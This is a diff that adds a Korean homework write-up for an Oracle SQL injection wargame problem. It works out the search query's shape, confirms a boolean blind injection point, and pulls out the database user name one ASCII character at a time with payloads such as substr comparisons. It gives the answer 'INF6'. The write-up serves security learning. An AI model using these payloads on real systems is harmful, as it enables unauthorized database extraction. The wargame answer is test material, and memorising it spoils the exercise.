@@ -1,0 +1,53 @@
+과제 내용
+
+========================================
+
+* SQL Injection Oracle 워게임 문제 4번
+
+========================================
+
+1. 풀이과정
+1. 쿼리문 유추
+안되면 다시 유추 -> 안되면 다시 유추
+
+select 컬림들 from 게시판 where 제목 like '%__검색어__%'
+
+2. 공격포인트
+' -> 
+검색어 : eq%' and 'f%'='f
+검색어 : eq%' and 'f%'='asdf
+============<- 참과 거짓이 구분이 된다. 취약함
+%'신경쓰기 싫어서 and사이에 공격쿼리를 넣음
+
+검색어 : eq%' and (공격쿼리) and 'f%'='f
+
+3. user명 뽑기
+select user from dual
+ 3-1. 글자수:
+ (select length(user) from dual) >0
+ 
+eq%' and (select length(user) from dual) >0 and 'f%'='f
+eq%' and (select length(user) from dual) =4 and 'f%'='f
+
+글자 수 : 4글자인 것을 찾음
+
+ 3-2. 한글자씩 아스키
+ (select ascii(substr(user,1~4,1)) from dual) > ??
+ 
+eq%' and (select ascii(substr(user,1,1)) from dual) > 70 and 'f%'='f
+eq%' and (select ascii(substr(user,1,1)) from dual) > 80 and 'f%'='f
+eq%' and (select ascii(substr(user,1,1)) from dual) =73 and 'f%'='f
+
+다음 user,2,1로해서 찾는다.
+eq%' and (select ascii(substr(user,2,1)) from dual) =78 and 'f%'='f
+
+eq%' and (select ascii(substr(user,3,1)) from dual) =70 and 'f%'='f
+
+eq%' and (select ascii(substr(user,4,1)) from dual) =54 and 'f%'='f
+cmd - py - chr(73) ... - user명을 찾음
+73, 78, 70, 54
+
+
+2. 정답
+정답 : INF6
+========================================
